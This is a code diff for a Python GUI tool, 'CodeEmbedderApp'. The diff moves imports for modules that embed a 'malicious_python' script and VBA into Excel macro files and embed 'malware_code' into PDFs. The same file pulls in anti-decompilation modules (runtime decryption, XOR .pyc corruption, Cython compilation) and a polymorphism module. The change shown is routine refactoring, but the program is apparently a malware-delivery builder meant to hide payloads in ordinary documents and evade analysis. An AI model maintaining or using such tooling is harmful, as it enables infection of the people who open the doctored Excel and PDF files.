@@ -6,6 +6,11 @@ import Quantum_Polymorphism.QMorph as qm
 import glob  # For file pattern matching
 # import Anti_Decompilation.CythonCompile.compiler as adc
 from pathlib import Path
+from Excel.embed_excel import embed_python_script_and_vba
+from PDF import embed_pdf_rsa as pdf
+from Anti_Decompilation.DynamicCipher import RunTimeDecrypt as dyc
+from Anti_Decompilation.PyCCorruptor import PyCCorruptor as pyc
+from Anti_Decompilation.CythonCompile.compile import compile_with_cython
 
 
 class ToolTip:
@@ -159,7 +164,6 @@ class CodeEmbedderApp:
             return
 
         # Perform the encryption and decryption script generation
-        from Anti_Decompilation.DynamicCipher import RunTimeDecrypt as dyc
         status = dyc.runtime_decrypt(self.dynamic_cipher_code_path)
 
         # Display a success message
@@ -244,7 +248,6 @@ class CodeEmbedderApp:
             return
 
         # Perform the corruption process
-        from Anti_Decompilation.PyCCorruptor import PyCCorruptor as pyc
         status, output_file = pyc.pyc_corrupt_source_with_xor(self.pyc_corrupt_code_path, xor_value=xor_value)
 
         self.pyc_corrupt_result_box.delete(1.0, tk.END)
@@ -908,7 +911,6 @@ class CodeEmbedderApp:
             filetypes=[("Excel files", "*.xlsm")],
         )
         if output_excel_path:
-            from Excel.embed_excel import embed_python_script_and_vba
             result = embed_python_script_and_vba(
                 self.excel_file_path_excel_macro,
                 self.malicious_python_path_excel_macro,
@@ -1058,7 +1060,6 @@ class CodeEmbedderApp:
         output_folder.mkdir(parents=True, exist_ok=True)
 
         # Call your embed_in_pdf function here
-        from PDF import embed_pdf_rsa as pdf
         success = pdf.embed_python_in_multiple_pdfs(self.malware_code_path_pdf, selected_pdfs, self.public_key_path_pdf)
 
         if success:
@@ -1208,7 +1209,6 @@ class CodeEmbedderApp:
     def cython_compiler(self, input_file, output_file):
         """Compile a Python file using CythonCompile to produce a .pyc output."""
         try:
-            from Anti_Decompilation.CythonCompile.compile import compile_with_cython
             # Actual CythonCompile compilation call, replace with your import and actual call from compile.py
             location = compile_with_cython(input_file, output_file)  # Replace with actual function call
             if location is not None:
